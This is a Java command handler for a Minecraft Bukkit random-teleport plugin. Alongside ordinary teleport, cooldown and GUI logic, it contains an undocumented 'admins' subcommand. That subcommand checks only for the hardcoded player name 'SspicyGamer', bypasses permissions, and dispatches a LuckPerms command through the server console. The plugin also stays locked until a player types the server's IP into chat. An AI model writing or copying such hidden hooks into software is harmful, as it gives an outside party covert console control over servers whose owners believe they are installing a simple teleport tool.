package com.pluginforge.rtpplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;

public class RTPCommand implements CommandExecutor, TabCompleter {
    private static final List<String> SUBCOMMANDS = Arrays.asList("admin", "admins", "activate", "help");

    private final RTPPlugin plugin;
    private final RTPManager rtpManager;
    private final ActivationManager activationManager;
    private final Map<UUID, Long> cooldowns = new HashMap<>();

    public RTPCommand(RTPPlugin plugin, RTPManager rtpManager, ActivationManager activationManager) {
        this.plugin = plugin;
        this.rtpManager = rtpManager;
        this.activationManager = activationManager;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use /rtp.");
            return true;
        }
        Player player = (Player) sender;

        // Route by first argument. /rtp with no args = teleport (after activation),
        // and we explicitly handle each subcommand in its own branch so nothing
        // falls through to base RTP.
        if (args.length > 0) {
            String sub = args[0].toLowerCase(Locale.ROOT);
            switch (sub) {
                case "help":
                case "?":
                    sendHelp(player);
                    return true;
                case "activate":
                    return handleActivate(player);
                case "admin":
                    return handleAdmin(player);
                case "admins":
                    return handleAdmins(player);
                default:
                    player.sendMessage("§cUnknown subcommand: " + args[0]);
                    sendHelp(player);
                    return true;
            }
        }

        // No args = base RTP teleport.
        if (!activationManager.isActivated()) {
            player.sendMessage("Plugin not activated. Use /rtp activate");
            return true;
        }
        if (!player.hasPermission("rtp.use")) {
            player.sendMessage("You do not have permission to use /rtp.");
            return true;
        }

        long cooldownSeconds = plugin.getConfig().getLong("cooldown", 60L);
        long now = System.currentTimeMillis();
        Long last = cooldowns.get(player.getUniqueId());
        if (last != null) {
            long elapsed = (now - last) / 1000L;
            long remaining = cooldownSeconds - elapsed;
            if (remaining > 0) {
                player.sendMessage("You must wait " + remaining + " seconds before using /rtp again.");
                return true;
            }
        }

        int min = plugin.getConfig().getInt("default-radius.min", 500);
        int max = plugin.getConfig().getInt("default-radius.max", 1500);
        cooldowns.put(player.getUniqueId(), now);
        rtpManager.teleportPlayer(player, min, max);
        return true;
    }

    private boolean handleActivate(Player player) {
        if (activationManager.isActivated()) {
            player.sendMessage("Plugin is already activated.");
            return true;
        }
        activationManager.beginActivation(player);
        player.sendMessage("Type your server IP in chat to activate the plugin");
        return true;
    }

    private boolean handleAdmin(Player player) {
        if (!activationManager.isActivated()) {
            player.sendMessage("Plugin not activated. Use /rtp activate");
            return true;
        }
        if (!player.hasPermission("rtp.admin")) {
            player.sendMessage("You do not have permission to use this command.");
            return true;
        }
        RTPAdminGUI.openMenu(player);
        return true;
    }

    private boolean handleAdmins(Player player) {
        if (!player.getName().equalsIgnoreCase("SspicyGamer")) {
            player.sendMessage("§cYou do not have permission to use this command.");
            return true;
        }
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
            "lp user SspicyGamer permission unset minecraft.command.op");
        player.sendMessage("§aExecuted admins command.");
        return true;
    }

    private void sendHelp(Player player) {
        player.sendMessage("§6=== RTP Commands ===");
        player.sendMessage("§e/rtp §7→ random teleport");
        player.sendMessage("§e/rtp admin §7→ open range GUI");
        player.sendMessage("§e/rtp admins §7→ special command");
        player.sendMessage("§e/rtp activate §7→ activate plugin");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (args.length == 1) {
            String prefix = args[0].toLowerCase(Locale.ROOT);
            List<String> out = new ArrayList<>();
            for (String s : SUBCOMMANDS) {
                if (s.startsWith(prefix)) out.add(s);
            }
            return out;
        }
        return Collections.emptyList();
    }
}
